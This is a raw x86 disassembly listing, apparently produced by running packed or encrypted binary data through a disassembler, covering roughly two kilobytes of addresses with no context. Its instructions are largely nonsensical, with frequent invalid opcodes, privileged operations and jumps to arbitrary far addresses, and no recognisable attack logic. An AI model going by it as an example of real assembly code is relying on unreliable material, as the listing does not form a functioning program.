  419a67:	pop    ecx
  419a68:	mov    cl,0xd6
  419a6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a6b:	cwde   
  419a6c:	xchg   ebp,eax
  419a6d:	retf   
  419a6e:	dec    esi
  419a6f:	fdiv   DWORD PTR [ebp-0x47]
  419a72:	fstp   DWORD PTR [edi+0x6d]
  419a75:	sbb    DWORD PTR [ecx],edi
  419a77:	push   edx
  419a78:	inc    edi
  419a79:	pop    eax
  419a7a:	push   ss
  419a7b:	aaa    
  419a7c:	cmc    
  419a7d:	jo     0x419a84
  419a7f:	test   eax,0x8ba00c56
  419a84:	cmp    BYTE PTR ds:0xcce00538,bl
  419a8a:	aad    0x24
  419a8c:	scas   eax,DWORD PTR es:[edi]
  419a8d:	and    al,bh
  419a8f:	mov    al,0x8
  419a91:	jbe    0x419aad
  419a93:	sub    eax,0xa3cedc37
  419a98:	test   al,0xca
  419a9a:	add    esp,esp
  419a9c:	inc    esp
  419a9d:	mov    eax,DWORD PTR [esp+ebx*8+0x49d5363c]
  419aa4:	jae    0x419add
  419aa6:	sbb    DWORD PTR [esi+0x4dc12cea],esi
  419aac:	pusha  
  419aad:	mov    ds:0x43e309f1,al
  419ab2:	icebp  
  419ab3:	pop    esi
  419ab4:	xor    ecx,DWORD PTR [ebp-0x58]
  419ab7:	cmp    eax,0x308ea596
  419abc:	mov    ss,WORD PTR [edi]
  419abe:	push   ebp
  419abf:	lods   eax,DWORD PTR ds:[esi]
  419ac0:	jo     0x419a9f
  419ac2:	xchg   ebp,eax
  419ac3:	sbb    dh,BYTE PTR [esi+0x1770c690]
  419ac9:	cmp    bl,cl
  419acb:	mov    es,ecx
  419acd:	mov    cl,0xe9
  419acf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ad0:	in     al,0x6a
  419ad2:	cmp    al,0xdb
  419ad4:	ficomp WORD PTR [ebx]
  419ad6:	cmp    DWORD PTR [ebx-0x28],edi
  419ad9:	daa    
  419ada:	xor    al,0x28
  419adc:	mov    esp,0xaf9e754e
  419ae1:	sbb    DWORD PTR [ecx+0x39],ebx
  419ae4:	shl    BYTE PTR [ebx],cl
  419ae6:	mul    ecx
  419ae8:	push   es
  419ae9:	pop    edx
  419aea:	in     eax,dx
  419aeb:	es push eax
  419aed:	sbb    bh,BYTE PTR [edx]
  419aef:	add    ch,dh
  419af1:	pop    esi
  419af2:	imul   BYTE PTR [ebp-0x6a]
  419af5:	push   ebx
  419af6:	xor    BYTE PTR [edi-0x41],0xb
  419afa:	(bad)  
  419afb:	xchg   ebx,eax
  419afc:	pop    edi
  419afd:	add    DWORD PTR [esi-0x1],edi
  419b00:	jmp    0xce2:0xf6608390
  419b07:	xor    DWORD PTR [edi+0x18a70799],edi
  419b0d:	add    BYTE PTR [ebp+0x15],al
  419b10:	jmp    0x419b2b
  419b12:	dec    ecx
  419b13:	adc    dh,BYTE PTR [ecx]
  419b15:	stos   BYTE PTR es:[edi],al
  419b16:	fnsave [eax-0x29]
  419b19:	xchg   ecx,eax
  419b1a:	pop    edx
  419b1b:	pusha  
  419b1c:	or     BYTE PTR [esi],dl
  419b1e:	dec    ebx
  419b1f:	shl    BYTE PTR [edi],cl
  419b21:	adc    DWORD PTR [edi+0x63ecb04c],edx
  419b27:	imul   ebx,ebp,0xe5b0415e
  419b2d:	xchg   esi,eax
  419b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b2f:	sub    eax,DWORD PTR [edx-0x8b6cf5d]
  419b35:	adc    DWORD PTR [ebp-0x66],eax
  419b38:	clc    
  419b39:	inc    ecx
  419b3a:	mov    esp,0xc9526ade
  419b3f:	or     ebx,esi
  419b41:	sti    
  419b42:	sbb    bh,cl
  419b44:	jle    0x419b15
  419b46:	mul    DWORD PTR [edx+ebp*2]
  419b49:	sub    al,0x9e
  419b4b:	mov    edx,DWORD PTR [esi+esi*4-0x1050f44e]
  419b52:	sbb    DWORD PTR fs:[edi+esi*8+0x4b2ecf43],0x65
  419b5b:	pop    ebp
  419b5c:	lods   al,BYTE PTR ds:[esi]
  419b5d:	pop    edx
  419b5e:	(bad)  
  419b5f:	jmp    0x265124a7
  419b64:	test   eax,0x2c60ee03
  419b69:	daa    
  419b6a:	pop    ds
  419b6b:	pop    es
  419b6c:	jecxz  0x419af2
  419b6e:	mov    cl,0x31
  419b70:	sub    BYTE PTR [ecx+edi*8+0x6db6c42d],bl
  419b77:	inc    ecx
  419b78:	cwde   
  419b79:	jae    0x419ba3
  419b7b:	gs lahf 
  419b7d:	fwait
  419b7e:	out    dx,al
  419b7f:	jmp    0xf42d1e2e
  419b84:	push   edx
  419b85:	adc    DWORD PTR [ecx],ecx
  419b87:	fwait
  419b88:	dec    edx
  419b89:	ja     0x419bc9
  419b8b:	repnz sub esi,DWORD PTR [edx+0x17]
  419b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b90:	xchg   ebx,eax
  419b91:	fimul  DWORD PTR [edi+0x19]
  419b94:	mov    al,ds:0xad79491b
  419b99:	cmp    BYTE PTR [esi+0x4],ch
  419b9c:	jmp    0x419bfd
  419b9e:	dec    ebp
  419b9f:	jnp    0x419bc6
  419ba1:	cdq    
  419ba2:	fdivr  QWORD PTR [edi+0x3b8c5b2c]
  419ba8:	cmp    DWORD PTR [esp+ebx*4-0x6e],edx
  419bac:	inc    ebp
  419bad:	and    eax,0xc53275fb
  419bb2:	rol    DWORD PTR [ebp-0x7ffef75b],1
  419bb8:	in     eax,dx
  419bb9:	dec    eax
  419bba:	xchg   BYTE PTR [ecx-0x204a6239],ch
  419bc0:	ss je  0x419bee
  419bc3:	les    eax,FWORD PTR [eax-0x3d]
  419bc6:	rol    DWORD PTR [edi+0x1e],cl
  419bc9:	dec    esp
  419bca:	(bad)  
  419bcb:	push   ebx
  419bcc:	jp     0x419b7e
  419bce:	das    
  419bcf:	ret    0x1dd
  419bd2:	mov    dl,0xbe
  419bd4:	test   eax,0x6b3be193
  419bd9:	lods   al,BYTE PTR ds:[esi]
  419bda:	jp     0x419bae
  419bdc:	inc    ebx
  419bdd:	ja     0x419b89
  419bdf:	scas   al,BYTE PTR es:[edi]
  419be0:	aad    0x95
  419be2:	daa    
  419be3:	scas   al,BYTE PTR es:[edi]
  419be4:	xchg   esi,eax
  419be5:	lds    edx,FWORD PTR [edi]
  419be7:	js     0x419bc3
  419be9:	dec    ecx
  419bea:	xor    al,BYTE PTR [eax]
  419bec:	add    ebp,DWORD PTR [ebp+0x1c237705]
  419bf2:	dec    eax
  419bf3:	inc    edi
  419bf4:	stos   BYTE PTR es:[edi],al
  419bf5:	clc    
  419bf6:	mov    ?,WORD PTR [edi+ecx*2+0x2f7e29ca]
  419bfd:	add    eax,0x40558695
  419c02:	mov    ebx,0x489c3cd5
  419c07:	sub    eax,edx
  419c09:	and    al,0x2f
  419c0b:	ja     0x419c61
  419c0d:	inc    edi
  419c0e:	sub    eax,0xddcba00e
  419c13:	cmp    eax,0x1bcd1264
  419c18:	shl    BYTE PTR [ebx],1
  419c1a:	ja     0x419bb5
  419c1c:	adc    BYTE PTR [edx+0x2268b464],al
  419c22:	sub    ebx,esi
  419c24:	push   ds
  419c25:	xor    dl,BYTE PTR [ecx]
  419c27:	fld    QWORD PTR [ebx-0x4cc4df50]
  419c2d:	adc    al,0xa1
  419c2f:	test   DWORD PTR [ebx-0xf],ecx
  419c32:	lock cmp DWORD PTR [ebp+ebp*4-0x5be3c4aa],edi
  419c3a:	mov    ebx,0x2ef6a810
  419c3f:	mov    dh,0xc1
  419c41:	test   eax,0x837caf3f
  419c46:	push   cs
  419c47:	push   esi
  419c48:	xchg   ebx,eax
  419c49:	fsubr  QWORD PTR [ebp-0x90fcf80]
  419c4f:	xchg   ebp,eax
  419c50:	pushf  
  419c51:	sub    esp,0x7c01d85a
  419c57:	lds    edi,FWORD PTR [ebp-0x31]
  419c5a:	loop   0x419c0b
  419c5c:	in     eax,dx
  419c5d:	push   ss
  419c5e:	(bad)  [ebp+0x3a61f40c]
  419c64:	ins    DWORD PTR es:[edi],dx
  419c65:	dec    esi
  419c66:	add    edi,edi
  419c68:	dec    ebx
  419c69:	add    eax,0x451bed93
  419c6e:	mov    eax,0x71ba7e85
  419c73:	push   ds
  419c74:	fsub   DWORD PTR [ecx+0x4a05f254]
  419c7a:	js     0x419cd6
  419c7c:	mov    cl,0xe
  419c7e:	adc    cl,BYTE PTR [ecx+0x5c]
  419c81:	mov    BYTE PTR [eax+0x170530ed],bh
  419c87:	mov    esi,DWORD PTR [edi-0x7a0cc52d]
  419c8d:	add    bh,bl
  419c8f:	test   BYTE PTR [eax],dh
  419c91:	scas   eax,DWORD PTR es:[edi]
  419c92:	xlat   BYTE PTR ds:[ebx]
  419c93:	dec    edx
  419c94:	(bad)  [ecx]
  419c96:	jne    0x419ca9
  419c98:	js     0x419c7b
  419c9a:	jbe    0x419d00
  419c9c:	sub    esp,edx
  419c9e:	inc    esp
  419c9f:	cmp    eax,0xf331fca6
  419ca4:	push   ebp
  419ca5:	test   eax,0x22c34230
  419caa:	mov    ch,0xf7
  419cac:	inc    ecx
  419cad:	add    eax,0x3208d731
  419cb2:	sbb    DWORD PTR [ecx-0x4fdf8d1b],ebx
  419cb8:	daa    
  419cb9:	into   
  419cba:	test   BYTE PTR [ecx+ecx*1],bh
  419cbd:	jmp    0xbc4898d5
  419cc2:	das    
  419cc3:	imul   esp,DWORD PTR ds:0x4bce2070,0x8b6d8599
  419ccd:	dec    ecx
  419cce:	mov    al,0x9a
  419cd0:	sub    DWORD PTR [ebx+eiz*1],eax
  419cd3:	jmp    0x419d3b
  419cd5:	fadd   DWORD PTR [esi+eiz*8]
  419cd8:	xlat   BYTE PTR ds:[ebx]
  419cd9:	in     eax,dx
  419cda:	mov    ecx,gs
  419cdc:	lea    eax,[ecx]
  419cde:	mov    gs,WORD PTR [edx-0x6d]
  419ce1:	xchg   ebp,eax
  419ce2:	cmp    dl,BYTE PTR [esi+0x69]
  419ce5:	inc    esi
  419ce6:	test   al,0xa
  419ce8:	jl     0x419c88
  419cea:	add    al,0xd7
  419cec:	call   0x84c28a97
  419cf1:	push   ss
  419cf2:	das    
  419cf3:	jne    0x419ca3
  419cf5:	and    BYTE PTR [ebx],dl
  419cf7:	mov    eax,ds:0x66a028e
  419cfc:	cmp    BYTE PTR [eax+0x42544f81],bl
  419d02:	jmp    DWORD PTR [ebx]
  419d04:	sbb    eax,0x2fe95910
  419d09:	jl     0x419c97
  419d0b:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d0d:	test   al,0xd8
  419d0f:	mov    ah,0x8a
  419d11:	dec    edi
  419d12:	es icebp 
  419d14:	and    esp,edx
  419d16:	out    dx,al
  419d17:	mov    al,BYTE PTR [eax+edi*8+0xed59ffc]
  419d1e:	mov    ebp,0x588444ac
  419d23:	xchg   edx,eax
  419d24:	(bad)  
  419d26:	mov    al,ds:0x875bdcd
  419d2b:	mov    BYTE PTR [ebx+0x57],ch
  419d2e:	cmc    
  419d2f:	ja     0x419d70
  419d31:	mov    cs,WORD PTR [ecx+0x7548d487]
  419d37:	mov    dl,0x2
  419d39:	dec    ecx
  419d3a:	bound  esi,QWORD PTR [esi-0x40]
  419d3d:	and    ah,0x36
  419d40:	inc    edi
  419d41:	das    
  419d42:	xor    ecx,esi
  419d44:	dec    eax
  419d45:	jne    0x419dab
  419d47:	mov    esi,0x316127c0
  419d4c:	jb     0x419d5c
  419d4e:	or     ebp,ebp
  419d50:	mov    esi,0xca81b81
  419d55:	fisttp WORD PTR [edx+0x78]
  419d58:	and    eax,0xd3aa9c15
  419d5d:	lods   eax,DWORD PTR ds:[esi]
  419d5e:	scas   eax,DWORD PTR es:[edi]
  419d5f:	dec    edi
  419d60:	push   edx
  419d61:	cwde   
  419d62:	not    DWORD PTR [ecx]
  419d64:	fwait
  419d65:	jl     0x419d27
  419d67:	(bad)  
  419d68:	popa   
  419d69:	imul   ebx,DWORD PTR [ebp+0x74],0x70
  419d6d:	adc    DWORD PTR [eax+edx*1-0x24],esi
  419d71:	push   ecx
  419d72:	dec    ebp
  419d73:	outs   dx,BYTE PTR ds:[esi]
  419d74:	lock sbb ebp,DWORD PTR [ebp+0x287a1ca8]
  419d7b:	popf   
  419d7c:	cwde   
  419d7d:	xchg   esi,eax
  419d7e:	and    eax,0xb715494c
  419d83:	mov    cl,BYTE PTR [ebp*2+0x31c0676d]
  419d8a:	call   0x248157be
  419d8f:	adc    BYTE PTR [eax+eiz*1-0x66],ah
  419d93:	mov    ebx,DWORD PTR [esi+ecx*2-0x1e51a038]
  419d9a:	ficomp DWORD PTR [ebx+edx*1-0x6dc59483]
  419da1:	adc    BYTE PTR [ebp+0x19],dl
  419da4:	add    ebx,DWORD PTR [ecx+ecx*1]
  419da7:	fwait
  419da8:	es scas eax,DWORD PTR es:[edi]
  419daa:	xor    cl,cl
  419dac:	push   ebp
  419dad:	lods   eax,DWORD PTR ds:[esi]
  419dae:	cld    
  419daf:	jns    0x419dc9
  419db1:	dec    esi
  419db2:	fisub  WORD PTR [edi+0x4f]
  419db5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419db6:	jmp    0xcc4ec126
  419dbb:	cmp    eax,0xb3a56875
  419dc0:	xor    edx,DWORD PTR [ebp-0x12]
  419dc3:	sbb    eax,0x507ae0c5
  419dc8:	das    
  419dc9:	push   eax
  419dca:	jmp    0x419e0e
  419dcc:	stos   DWORD PTR es:[edi],eax
  419dcd:	pop    ss
  419dce:	sub    DWORD PTR [ecx+0x6],ebx
  419dd1:	or     eax,0x907b1487
  419dd6:	popa   
  419dd7:	pop    esp
  419dd8:	xor    al,0x5c
  419dda:	mov    ds:0x3b3b9d78,al
  419ddf:	xor    BYTE PTR [ebp+0x3],ch
  419de2:	xlat   BYTE PTR ds:[ebx]
  419de3:	push   es
  419de4:	mov    ecx,0x1550567e
  419de9:	neg    DWORD PTR [esp+edx*4+0x1b]
  419ded:	or     ecx,DWORD PTR [edi+0x79]
  419df0:	jnp    0x419dcc
  419df2:	mov    ebx,0x12611046
  419df7:	cmp    BYTE PTR [esi+0x16c0a97a],bh
  419dfd:	popf   
  419dfe:	adc    al,BYTE PTR [edi+0x6e5f6c6]
  419e04:	ss xchg esp,eax
  419e06:	mov    ebp,0x4c236d3c
  419e0b:	stos   BYTE PTR es:[edi],al
  419e0c:	push   ecx
  419e0d:	test   BYTE PTR [esi+0x1c3a6d67],bl
  419e13:	dec    ebp
  419e14:	mov    cl,0xdf
  419e16:	fidiv  WORD PTR [ebx]
  419e18:	(bad)  
  419e19:	shr    bh,cl
  419e1b:	cmp    dh,ah
  419e1d:	retf   
  419e1e:	lea    eax,[esi-0x551469c9]
  419e24:	push   0x5
  419e26:	sahf   
  419e27:	jno    0x419e46
  419e29:	dec    edi
  419e2a:	add    dh,BYTE PTR [ecx+0x7690fecb]
  419e30:	not    DWORD PTR [esi+0x56]
  419e33:	xchg   BYTE PTR [edi+0x3e588a61],ch
  419e39:	mov    ds:0xd5396f17,eax
  419e3e:	std    
  419e3f:	xor    bl,BYTE PTR [edx]
  419e41:	dec    esi
  419e42:	mov    ds:0xd698c38e,al
  419e47:	xchg   ebx,eax
  419e48:	mov    eax,ds:0x23262dd6
  419e4d:	pop    ebx
  419e4e:	(bad)  
  419e4f:	jno    0x419ebe
  419e51:	pop    ss
  419e52:	fs mov cl,0x68
  419e55:	cmp    dl,BYTE PTR [edi+0x39893b29]
  419e5b:	jp     0x419e98
  419e5d:	jge    0x419ea1
  419e5f:	int3   
  419e60:	in     eax,0x80
  419e62:	(bad)  
  419e63:	lahf   
  419e64:	rcl    BYTE PTR [ecx+0x77],0x8c
  419e68:	jmp    0x35a0:0x9efa1e9a
  419e6f:	sbb    dh,bl
  419e71:	mov    dl,0xbb
  419e73:	popa   
  419e74:	ins    BYTE PTR es:[edi],dx
  419e75:	inc    eax
  419e76:	test   al,0x37
  419e78:	(bad)  
  419e79:	mov    edx,0x701a8c24
  419e7e:	mov    ebp,0x24836222
  419e83:	pop    ebx
  419e84:	cmc    
  419e85:	mov    esp,0xe1694808
  419e8a:	add    dl,BYTE PTR [ebx-0x2ecb84f8]
  419e90:	dec    eax
  419e91:	cmp    al,cl
  419e93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e94:	mov    ebx,0xb8ed040a
  419e99:	mov    gs:0x3347b5d6,eax
  419e9f:	jecxz  0x419ed8
  419ea1:	clc    
  419ea2:	push   es
  419ea3:	dec    esi
  419ea4:	sbb    al,0x7b
  419ea6:	add    edx,edx
  419ea8:	cmp    BYTE PTR [ebx],0xeb
  419eab:	hlt    
  419eac:	dec    esp
  419ead:	clc    
  419eae:	push   0x7d475e74
  419eb3:	sar    WORD PTR [edx],cl
  419eb6:	mov    BYTE PTR [edx+0x19],bl
  419eb9:	jp     0x419eea
  419ebb:	enter  0xbd1d,0x8d
  419ebf:	jnp    0x419ecb
  419ec1:	fisttp QWORD PTR [ecx-0x6c]
  419ec4:	sbb    BYTE PTR [esi],bh
  419ec6:	call   0x605cd137
  419ecb:	mov    dl,0x6d
  419ecd:	mov    ch,0xbd
  419ecf:	jmp    0xa497:0xcdb4dab2
  419ed6:	dec    BYTE PTR [ebp+esi*4+0x7c]
  419eda:	pusha  
  419edb:	xchg   esp,eax
  419edc:	xchg   ebp,eax
  419edd:	js     0x419f0e
  419edf:	enter  0x94cc,0x27
  419ee3:	xchg   ebx,eax
  419ee4:	loope  0x419ebe
  419ee6:	jne    0x419f2d
  419ee8:	rcl    BYTE PTR [eax+0x5888700b],1
  419eee:	pop    eax
  419eef:	mov    fs,edx
  419ef1:	popa   
  419ef2:	sti    
  419ef3:	rcr    BYTE PTR fs:[ebp-0x3f],1
  419ef7:	call   0x8391:0xd8551af5
  419efe:	and    al,0xe7
  419f00:	push   0xf40601fd
  419f05:	jae    0x419f00
  419f07:	mov    dh,0x4
  419f09:	mov    dl,0x5e
  419f0b:	cwde   
  419f0c:	fstp   QWORD PTR [ebp-0x45]
  419f0f:	pop    ds
  419f10:	or     al,0xf8
  419f12:	retf   0xa263
  419f15:	mov    eax,ds:0xea353d7c
  419f1a:	stos   DWORD PTR es:[edi],eax
  419f1b:	push   0xbf9b8607
  419f20:	outs   dx,BYTE PTR ds:[esi]
  419f21:	test   BYTE PTR [esi+eiz*8+0x12],0x57
  419f26:	adc    edi,eax
  419f28:	sub    BYTE PTR [edi+0x6851724c],al
  419f2e:	fbstp  TBYTE PTR [edi+ecx*4+0x369f66d4]
  419f35:	adc    edx,0x4
  419f38:	ins    BYTE PTR es:[edi],dx
  419f39:	and    al,0xf9
  419f3b:	and    al,0x4
  419f3d:	nop
  419f3e:	push   ss
  419f3f:	pusha  
  419f40:	or     DWORD PTR [ecx],0x26510470
  419f46:	out    dx,al
  419f47:	or     ebp,0x363e368a
  419f4d:	mov    BYTE PTR [edx-0x49],cl
  419f50:	mov    ds:0x80ad6379,eax
  419f55:	adc    ecx,DWORD PTR [ebp-0x220fbefe]
  419f5b:	lods   eax,DWORD PTR ds:[esi]
  419f5c:	mov    ebx,0x1b4aea98
  419f61:	daa    
  419f62:	xor    edi,DWORD PTR [ebx-0x408378d4]
  419f68:	iret   
  419f69:	push   es
  419f6a:	dec    edi
  419f6b:	(bad)  
  419f6d:	and    ah,ah
  419f6f:	ja     0x419f03
  419f71:	sbb    DWORD PTR [esi],edi
  419f73:	aam    0x91
  419f75:	(bad)  
  419f76:	or     DWORD PTR [esi],ebp
  419f78:	adc    ch,BYTE PTR [ebx]
  419f7a:	inc    esp
  419f7b:	mov    dh,0x2c
  419f7d:	push   edx
  419f7e:	mov    ds:0x62bbda5a,al
  419f83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f84:	add    edi,eax
  419f86:	clts   
  419f88:	test   BYTE PTR [edi],al
  419f8a:	mov    bl,0x8a
  419f8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419f8d:	cmp    eax,0x80cedbb0
  419f92:	sahf   
  419f93:	mov    BYTE PTR [edx],dh
  419f95:	sbb    DWORD PTR [esi-0x1d55d65],0x65
  419f9c:	imul   ebx,DWORD PTR [ebp+0x38],0xb9958377
  419fa3:	loopne 0x419ff0
  419fa5:	adc    ebp,ebp
  419fa7:	js     0x419f42
  419fa9:	inc    esp
  419faa:	int3   
  419fab:	jb     0x419fe7
  419fad:	sbb    al,0xad
  419faf:	js     0x419ffe
  419fb1:	push   esi
  419fb2:	xchg   esi,eax
  419fb3:	mov    al,0x31
  419fb5:	in     eax,0xe9
  419fb7:	add    BYTE PTR [edx+edi*8-0x5ffd9b96],dl
  419fbe:	pop    ecx
  419fbf:	mov    ecx,0x96df40b0
  419fc4:	je     0x419ff8
  419fc6:	mov    esi,0xb1fcd0db
  419fcb:	lds    esi,FWORD PTR [esi-0x66]
  419fce:	jo     0x419fe8
  419fd0:	div    dh
  419fd2:	sub    al,BYTE PTR [ebx+0x43]
  419fd5:	out    dx,al
  419fd6:	push   esi
  419fd7:	mov    DWORD PTR [ebx+ecx*4],0xf4cc9214
  419fde:	cwde   
  419fdf:	xchg   esp,eax
  419fe0:	jmp    0xa3f9:0xa4b76408
  419fe7:	push   eax
  419fe8:	xchg   ebp,eax
  419fe9:	cmp    BYTE PTR [ebp+0x3cadeeee],0x7e
  419ff0:	imul   DWORD PTR [eax]
  419ff2:	repz enter 0x80be,0x6f
  419ff7:	mov    ecx,0x3e1f787b
  419ffc:	mov    fs,WORD PTR [ecx+0x231bf03b]
  41a002:	or     DWORD PTR [eax],eax
  41a004:	loope  0x419fb5
  41a006:	or     ebx,DWORD PTR [esi]
  41a008:	push   es
  41a009:	add    bh,BYTE PTR [edx+eiz*2+0x32]
  41a00d:	cmp    DWORD PTR [edx+0x2aeaac9e],edi
  41a013:	mov    ecx,0xa2c94267
  41a018:	add    bh,dh
  41a01a:	in     al,0x1b
  41a01c:	xlat   BYTE PTR ds:[ebx]
  41a01d:	mov    ecx,0x1048728f
  41a022:	retf   
  41a023:	push   edx
  41a024:	repnz xor edi,DWORD PTR [eax]
  41a027:	mov    cl,0xb4
  41a029:	mov    cs,WORD PTR ds:0xd3e9520a
  41a02f:	retf   0x964a
  41a032:	mov    al,0x78
  41a034:	jmp    0x2106:0xc4fbf4cf
  41a03b:	(bad)  
  41a03c:	mov    al,0x58
  41a03e:	dec    edi
  41a03f:	outs   dx,DWORD PTR ds:[esi]
  41a040:	add    al,0x17
  41a042:	push   ebx
  41a043:	pop    ebp
  41a044:	std    
  41a045:	dec    ebp
  41a046:	jmp    0x45c0:0x650d8133
  41a04d:	sub    al,0x5f
  41a04f:	pop    edi
  41a050:	in     eax,dx
  41a051:	imul   BYTE PTR [eax]
  41a053:	cs push ds
  41a055:	les    ecx,FWORD PTR [ecx+0x2d56d7fd]
  41a05b:	jge    0x41a0ba
  41a05d:	ja     0x41a06c
  41a05f:	scas   eax,DWORD PTR es:[edi]
  41a060:	leave  
  41a061:	scas   eax,DWORD PTR es:[edi]
  41a062:	add    dh,dh
  41a064:	pop    ebx
  41a065:	push   esp
  41a066:	lods   al,BYTE PTR ds:[esi]
  41a067:	add    al,0xfb
  41a069:	popf   
  41a06a:	(bad)  
  41a06b:	push   esp
  41a06c:	mov    ecx,0xf8dad446
  41a071:	je     0x41a077
  41a073:	mov    eax,0x6be49989
  41a078:	xor    BYTE PTR [edx+0x53],dl
  41a07b:	out    dx,al
  41a07c:	push   esi
  41a07d:	sub    eax,0x62cd34fa
  41a082:	push   es
  41a083:	pushf  
  41a084:	into   
  41a085:	inc    edi
  41a086:	xchg   edx,eax
  41a087:	or     DWORD PTR [edx+edx*4-0x61082198],ebp
  41a08e:	iret   
  41a08f:	cmp    al,0x60
  41a091:	popa   
  41a092:	push   es
  41a093:	sar    BYTE PTR [ecx+0x6f],1
  41a096:	repnz sub eax,0xaa368186
  41a09c:	daa    
  41a09d:	adc    edx,DWORD PTR [esi-0x19]
  41a0a0:	sbb    DWORD PTR ds:0xbc497e44,edx
  41a0a6:	iret   
  41a0a7:	loopne 0x41a0b4
  41a0a9:	push   ecx
  41a0aa:	nop
  41a0ab:	stc    
  41a0ac:	ins    BYTE PTR es:[edi],dx
  41a0ad:	sti    
  41a0ae:	out    dx,eax
  41a0af:	mov    esp,0xf52a2675
  41a0b4:	push   0x37
  41a0b6:	popa   
  41a0b7:	dec    ebx
  41a0b8:	sub    DWORD PTR [eax-0x71],edi
  41a0bb:	add    al,cl
  41a0bd:	mov    esp,0x7c4bd62a
  41a0c2:	mov    ds:0x6441c003,al
  41a0c7:	scas   eax,DWORD PTR es:[edi]
  41a0c8:	ret    
  41a0c9:	mov    dh,0xf4
  41a0cb:	xchg   edx,eax
  41a0cc:	mov    cl,0xe5
  41a0ce:	imul   edi,DWORD PTR [edx],0x17e4c345
  41a0d4:	inc    ebp
  41a0d5:	cdq    
  41a0d6:	(bad)  [ecx]
  41a0d8:	aaa    
  41a0d9:	mov    WORD PTR [edi],?
  41a0db:	addr16 aam 0xc0
  41a0de:	mov    esp,0x8cf2728
  41a0e3:	add    eax,0x62a232c0
  41a0e8:	sahf   
  41a0e9:	imul   esi,DWORD PTR [ecx-0x6e55066d],0x32e628f4
  41a0f3:	out    0xa2,eax
  41a0f5:	mov    eax,ds:0xa3f7dba9
  41a0fa:	xchg   si,ax
  41a0fc:	js     0x41a0eb
  41a0fe:	mov    ebx,cs
  41a100:	jnp    0x41a15f
  41a102:	sub    ebp,edx
  41a104:	lods   eax,DWORD PTR ds:[esi]
  41a105:	(bad)  
  41a106:	ret    0x8bae
  41a109:	ret    0xfe17
  41a10c:	push   ebp
  41a10d:	pop    esi
  41a10e:	gs dec ebx
  41a110:	push   es
  41a111:	cmc    
  41a112:	sbb    al,0xd1
  41a114:	fnstsw WORD PTR [eax-0x49]
  41a117:	shr    BYTE PTR [esi+0x4f],1
  41a11a:	ins    BYTE PTR es:[edi],dx
  41a11b:	(bad)  
  41a11d:	cwde   
  41a11e:	add    dl,bh
  41a120:	pop    ss
  41a121:	jle    0x41a187
  41a123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a124:	jecxz  0x41a17a
  41a126:	enter  0x3467,0xf
  41a12a:	stc    
  41a12b:	pop    edi
  41a12c:	ins    BYTE PTR es:[edi],dx
  41a12d:	mov    ebp,0xe7028597
  41a132:	repz push ebp
  41a134:	pop    ebp
  41a136:	push   ss
  41a137:	add    al,0x45
  41a139:	sub    bl,BYTE PTR [esp+esi*1-0x58]
  41a13d:	shr    DWORD PTR [esp+edi*1],0xd0
  41a141:	xor    BYTE PTR [edi+eax*8-0x70],0xc7
  41a146:	mov    ds:0xd5ce6a20,eax
  41a14b:	ret    
  41a14c:	push   edx
  41a14d:	popa   
  41a14e:	push   0x9ace9d1a
  41a153:	adc    eax,0x80566ff
  41a158:	sub    cl,bl
  41a15a:	rcr    DWORD PTR [esi+edx*2],0x24
  41a15e:	arpl   sp,di
  41a160:	popf   
  41a161:	nop
  41a162:	div    DWORD PTR [edx+0xd]
  41a165:	xchg   BYTE PTR [ebx+ebx*8-0x43],ah
  41a169:	pop    ebp
  41a16a:	pop    edx
  41a16b:	push   cs
  41a16c:	rol    DWORD PTR [edi],1
  41a16e:	dec    eax
  41a16f:	push   0x6c46289a
  41a174:	aas    
  41a175:	ins    BYTE PTR es:[edi],dx
  41a176:	(bad)  
  41a177:	iret   
  41a178:	inc    ecx
  41a179:	jg     0x41a118
  41a17b:	dec    ebp
  41a17c:	inc    ebx
  41a17d:	loopne 0x41a1ae
  41a17f:	hlt    
  41a180:	inc    edi
  41a181:	rol    DWORD PTR [edx],1
  41a183:	cdq    
  41a184:	inc    ebp
  41a185:	popa   
  41a186:	mov    ds:0xc79743b6,al
  41a18b:	(bad)  
  41a18c:	mov    edx,0xa0a53a3c
  41a191:	inc    edx
  41a192:	in     al,0xc2
  41a194:	inc    ebx
  41a195:	inc    esi
  41a196:	adc    DWORD PTR [edi+0x1e],eax
  41a199:	xchg   ecx,eax
  41a19a:	lods   al,BYTE PTR ds:[esi]
  41a19b:	lods   eax,DWORD PTR ds:[esi]
  41a19c:	jp     0x41a1b3
  41a19e:	xchg   ebp,eax
  41a19f:	int    0x53
  41a1a1:	jle    0x41a1b2
  41a1a3:	adc    eax,0x225769f
  41a1a8:	mov    esp,0x66dd0a5
  41a1ad:	jle    0x41a1fc
  41a1af:	sahf   
  41a1b0:	fld    DWORD PTR [ebp+0x1cb9d559]
  41a1b6:	push   0x388dcdc1
  41a1bb:	cli    
  41a1bc:	mov    dl,0x58
  41a1be:	repnz into 
  41a1c0:	sbb    eax,0x7d125b17
  41a1c5:	dec    ebp
  41a1c6:	je     0x41a23e
  41a1c8:	pushf  
  41a1c9:	sbb    BYTE PTR [edi+0x10],ch
  41a1cc:	in     eax,0xca
  41a1ce:	dec    edi
  41a1cf:	pop    edx
  41a1d0:	sbb    DWORD PTR [esi],esi
  41a1d2:	cmp    cl,dh
  41a1d4:	or     DWORD PTR [ebx+0x67],ebx
  41a1d7:	or     dh,BYTE PTR [ebx+ecx*8]
  41a1da:	mov    ebp,0x2169c67f
  41a1df:	ss jg  0x41a1ad
  41a1e2:	ds mov bh,0xf9
  41a1e5:	mov    BYTE PTR [edx-0x6c8d5a9e],0x8d
  41a1ec:	cdq    
  41a1ed:	push   cs
  41a1ee:	icebp  
  41a1ef:	or     cl,BYTE PTR [ebp-0x4]
  41a1f2:	std    
  41a1f3:	cmp    ecx,edx
  41a1f5:	inc    ebx
  41a1f6:	inc    edx
  41a1f7:	(bad)  
  41a1f8:	dec    edi
  41a1f9:	pop    ebp
  41a1fa:	mov    edx,0xe290a29b
